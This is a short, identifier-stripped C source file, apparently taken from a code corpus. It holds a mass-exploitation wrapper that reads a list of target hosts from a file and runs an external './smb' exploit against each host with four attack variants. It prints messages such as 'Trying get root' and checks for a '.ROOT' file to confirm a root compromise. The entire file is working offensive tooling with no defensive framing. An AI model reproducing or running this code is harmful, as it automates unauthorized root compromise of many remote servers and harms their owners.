
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {int dummy; } ;
typedef int FILE ;


 int FUNC_0 (int *) ;
 int * FUNC_1 (char*,int,int *) ;
 int * FUNC_2 (char*,char*) ;
 int FUNC_3 (int ,char*,char*) ;
 int FUNC_4 (char*,...) ;
 int FUNC_5 (char*,char*,int,char*,char*) ;
 int FUNC_6 (char*,struct stat*) ;
 int VAR_0 ;
 int FUNC_7 (char*) ;
 int FUNC_8 (char*) ;
 int FUNC_9 (char*) ;

int FUNC_10(char *VAR_1, char *VAR_2)
{
  FILE *VAR_3,*VAR_4;
  char VAR_5[512];
  char VAR_6[100];
  int VAR_7;
  struct stat VAR_8;

  if((VAR_3=FUNC_2(VAR_1,"r")) == ((void*)0)) {
    FUNC_3(VAR_0,"File %s not found!\n", VAR_1);
    return -1;
  }

  while(FUNC_1(VAR_5,512,VAR_3) != ((void*)0))
  {
    if(VAR_5[FUNC_7(VAR_5)-1]=='\n') VAR_5[FUNC_7(VAR_5)-1]=0;
    for (VAR_7=0;VAR_7<4;VAR_7++) {
       FUNC_5(VAR_6, "./smb %d %s %s", VAR_7, VAR_5, VAR_2);
       FUNC_4("\nTrying get root %s use type %d ...\n",VAR_5,VAR_7);
       FUNC_8(VAR_6);
       if (FUNC_6(".ROOT", &VAR_8) != -1) {
          FUNC_9(".ROOT");
          break;
       }
    }
  }
  FUNC_0(VAR_3);
  FUNC_4("\nMass exploiting finished.\n");
}
